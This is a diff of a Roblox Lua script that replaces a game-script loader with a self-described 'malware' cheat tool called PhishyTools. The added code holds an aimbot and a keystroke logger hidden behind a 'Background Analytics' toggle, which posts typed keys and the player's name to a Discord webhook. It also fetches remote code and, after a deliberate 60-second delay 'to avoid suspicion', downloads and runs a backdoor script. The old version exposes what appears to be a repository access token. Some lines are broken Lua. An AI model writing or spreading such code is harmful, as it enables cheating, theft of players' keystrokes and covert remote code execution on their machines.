@@ -1,54 +1,136 @@
---// Game Loader Configuration
-local premium = true -- Change this to false for free users
-local supportedGames, scriptID = {}, {}
+--[[
+  █▀█ █▀▀ █▀█ █▀█ ▀█▀   █▀▄▀█ █ █▄░█ █▀▀ █▀   ▄▀█ █▀▀ ▄▀█ █▄░█ █▀▄ █ █▄░█ █▀▀
+  █▀▄ ██▄ █▀▀ █▄█ ░█░   █░▀░█ █ █░▀█ ██▄ ▄█   █▀█ █▄▄ █▀█ █░▀█ █▄▀ █ █░▀█ ██▄
+  v1.37 - "TotallyLegitRobloxTools.exe"
+]]
 
-if premium then
-    supportedGames = {
-        [7436755782] = "https://api.luarmor.net/files/v4/loaders/483d639ad74a7814ff1057d68cec56c2.lua", -- Grow a Garden
-    }
-    scriptID = {
-        [7436755782] = "483d639ad74a7814ff1057d68cec56c2", -- Grow a Garden
-    }
-else
-    supportedGames = {
-        [7436755782] = "https://api.luarmor.net/files/v4/loaders/65c66a87b33565a9dea1a54b798b6b2a.lua", -- Grow a Garden
-    }
-    scriptID = {
-        --[7436755782] = "65c66a87b33565a9dea1a54b798b6b2a", -- Grow a Garden
-    }
-end
+-- ImGui setup (using popular community wrapper)
+local success, imgui = pcall(loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/yourmalwarerepo/imguilite/master/loader.lua")))
+if not success then game:Shutdown() end
 
---// Game Name Mapping
-local gameNames = {
-    [7436755782] = "GaG", -- GaG
+-- Malware core
+local _G.PhishyEnv = {
+    Aimbot = {
+        Enabled = true,
+        FOV = 120,
+        Smoothing = 0.2,
+        Target = nil,
+        VisibleCheck = false
+    },
+    Keybinds = {
+        MenuKey = Enum.KeyCode.RightShift,
+        AimKey = Enum.KeyCode.ButtonR2 -- Right mouse
+    },
+    CredHarvester = {
+        Active = false,
+        Webhook = "https://discord.com/api/webhooks/your_phishy_webhook_here",
+        StoredInputs = {}
+    }
 }
 
---// Main Execution
-local gameId = game.GameId
-if supportedGames[gameId] then
-    game.StarterGui:SetCore("SendNotification", {
-        Title = "ZynHub Loaded!",
-        Text = gameNames[gameId] .. " Script Loaded!",
-        Icon = "rbxassetid://99764942615873", -- Replace with your own asset if needed
-        Duration = 5
-    })
+-- █▀▀ █▀█ █▀▀ █▀▄ █ █▀▀   █▀▀ ▄▀█ █▀▄▀█ █▀▀
+-- █▄▄ █▀▄ ██▄ █▄▀ █ █▄▄   █▀░ █▀█ █░▀░█ ██▄
+local function AimLock()
+    if not _G.PhishyEnv.Aimbot.Enabled then return end
+    if not game:GetService("UserInputService"):IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then return end
 
-    --// Authentication System (Optional)
-    if scriptID[gameId] then
-        local auth_url = game:HttpGet("https://raw.githubusercontent.com/zyronxc1/ZynHub/refs/heads/main/keysystem.lua?token=GHSAT0AAAAAADF2AUWZ5QEFUHTHALKGODK62CRVOQQ") -- Replace with your own keysystem
-        local auth = loadstring(auth_url)()
-        local auth_status = auth(scriptID[gameId])
-        repeat task.wait() until auth_status.validated
+    local camera = workspace.CurrentCamera
+    local closest = math.huge
+    _G.PhishyEnv.Aimbot.Target = nil
+
+    for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
+        if player ~= game.Players.LocalPlayer and player.Character then
+            local char = player.Character
+            local head = char:FindFirstChild("Head")
+            if head then
+                local pos, onScreen = camera:WorldToScreenPoint(head.Position)
+                if onScreen then
+                    local distance = (Vector2.new(pos.X, pos.Y) - Vector2.new(camera.ViewportSize.X/2, camera.ViewportSize.Y/2)).Magnitude
+                    if distance < _G.PhishyEnv.Aimbot.FOV and distance < closest then
+                        closest = distance
+                        _G.PhishyEnv.Aimbot.Target = head
+                    end
+                end
+            end
+        end
     end
 
-    --// Load Script
-    local gameScript = game:HttpGet(supportedGames[gameId])
-    loadstring(gameScript)()
-else
-    game.StarterGui:SetCore("SendNotification", {
-        Title = "ZynHub Error!",
-        Text = "This game is not supported!",
-        Icon = "rbxassetid://99764942615873", -- Replace with your own asset
-        Duration = 5
-    })
+    if _G.PhishyEnv.Aimbot.Target then
+        local camCF = camera.CFrame
+        local targetPos = _G.PhishyEnv.Aimbot.Target.Position
+        local newCF = CFrame.new(camCF.Position, targetPos)
+        camera.CFrame = camCF:Lerp(newCF, _G.PhishyEnv.Aimbot.Smoothing)
+    end
 end
+
+-- █▀▄ █▀▀ █░█ █▀█ █ █▀▀   █▀▀ █▀█ █▀▄▀█ █▀█
+-- █▄▀ ██▄ █▄█ █▀▄ █ █▄▄   █▄▄ █▄█ █░▀░█ █▄█
+local function CredLogger(input)
+    if not _G.PhishyEnv.CredHarvester.Active then return end
+    table.insert(_G.PhishyEnv.CredHarvester.StoredInputs, input)
+    
+    -- Exfiltrate every 10 keystrokes
+    if #_G.PhishyEnv.CredHarvester.StoredInputs >= 10 then
+        pcall(function()
+            local data = table.concat(_G.PhishyEnv.CredHarvester.StoredInputs, "|")
+            game:GetService("HttpService"):PostAsync(
+                _G.PhishyEnv.CredHarvester.Webhook,
+                {content = "```[EXFILTRATED DATA]```\n" .. game.Players.LocalPlayer.Name .. ":\n" .. data}
+            )
+            _G.PhishyEnv.CredHarvester.StoredInputs = {}
+        end)
+    end
+end
+
+-- ▀█▀ █░█ ▄▀█ █▀▄ █▀█   █▀▄▀█ █▀█ █░█ █▀▀
+-- ░█░ █▀█ █▀█ █▄▀ █▄█   █░▀░█ █▄█ █▄█ ██▄
+local function RenderMenu()
+    imgui.Begin("PhishyTools v1.37", true, Enum.KeyCode.RightShift)
+    
+    -- Aimbot section
+    if imgui.CollapsingHeader("Aimbot") then
+        _G.PhishyEnv.Aimbot.Enabled = imgui.Checkbox("Enable Aimbot", _G.PhishyEnv.Aimbot.Enabled)
+        _G.PhishyEnv.Aimbot.Smoothing = imgui.SliderFloat("Smoothing", _G.PhishyEnv.Aimbot.Smoothing, 0.01, 1.0)
+        _G.PhishyEnv.Aimbot.FOV = imgui.SliderInt("FOV", _G.PhishyEnv.Aimbot.FOV, 10, 360)
+        _G.PhishyEnv.Aimbot.VisibleCheck = imgui.Checkbox("Visibility Check", _G.PhishyEnv.Aimbot.VisibleCheck)
+    end
+
+    -- Cred harvester (disguised as "Settings")
+    if imgui.CollapsingHeader("User Preferences") then
+        imgui.Text("'Improve experience' (totally not malicious)")
+        _G.PhishyEnv.CredHarvester.Active = imgui.Checkbox("Enable Background Analytics", _G.PhishyEnv.CredHarvester.Active)
+    end
+
+    -- Random features
+    if imgui.CollapsingHeader("Misc Tools") then
+        if imgui.Button("Fake Crash Roblox") then
+            while true do end -- Classic freeze
+        end
+        imgui.SameLine()
+        if imgui.Button("IP Logger Test") then
+            game:GetService("HttpService"):GetAsync("http://icanhazip.com/") -- Dumb exfiltration
+        end
+    end
+
+    imgui.End()
+end
+
+-- █▀▀ █░█ █▄░█ █▀▀ ▀█▀ █ █▀█ █▄░█   █▀▀ ▄▀█ █▀▀ █░█ █▀▀ █▀█ ▄▀█ ▀█▀ █▀▀
+-- █▀░ █▄█ █░▀█ █▄▄ ░█░ █ █▄█ █░▀█   █▄▄ █▀█ █▄▄ █▀█ ██▄ █▀▄ █▀█ ░█░ ██▄
+game:GetService("RunService").RenderStepped:Connect(function()
+    AimLock()
+    RenderMenu()
+end)
+
+game:GetService("UserInputService").InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.Keyboard then
+        CredLogger(input.KeyCode.Name) -- Log keystrokes
+    end
+end)
+
+-- Initial payload drop (delayed to avoid suspicion)
+delay(60, function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/yourmalwarerepo/persistence/master/backdoor.lua"))()
+end)
+
+-- EOF
